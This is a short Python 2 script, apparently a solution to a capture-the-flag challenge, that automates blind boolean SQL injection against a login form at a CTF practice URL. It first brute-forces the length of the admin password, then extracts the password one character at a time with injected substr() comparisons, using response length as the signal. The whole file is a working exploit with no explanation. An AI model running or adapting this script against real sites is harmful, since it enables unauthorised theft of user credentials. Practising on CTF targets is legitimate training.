import urllib
import urllib2

passwordlist = []

for i in range(1, 50):
    req = {'id': "admin' and (SELECT length(pass) FROM user WHERE id='admin') =" + str(i) + "--",'pass':''}
    params = urllib.urlencode(req)
    url = 'http://ctfq.sweetduet.info:10080/~q6/'
    request = urllib2.Request(url, params)
    response = urllib2.urlopen(request)
    data = response.read()
    if len(data) > 2000:
        print "The password has "+str(i)+" characters"
        passlen = i
        break
for j in range(1, passlen + 1):
    for x in range(33, 127):
        req = {'id': "admin' and substr((SELECT pass FROM user WHERE id='admin'),"+str(j)+",1)='"+chr(x)+"'--",'pass':''}
        params = urllib.urlencode(req)
        url = 'http://ctfq.sweetduet.info:10080/~q6/'
        request = urllib2.Request(url, params)
        response = urllib2.urlopen(request)
        data = response.read()
        if len(data) > 2000:
            print chr(x),
            passwordlist.append(chr(x))
            break

password = "".join(passwordlist)
print ""
print "The password is " + password
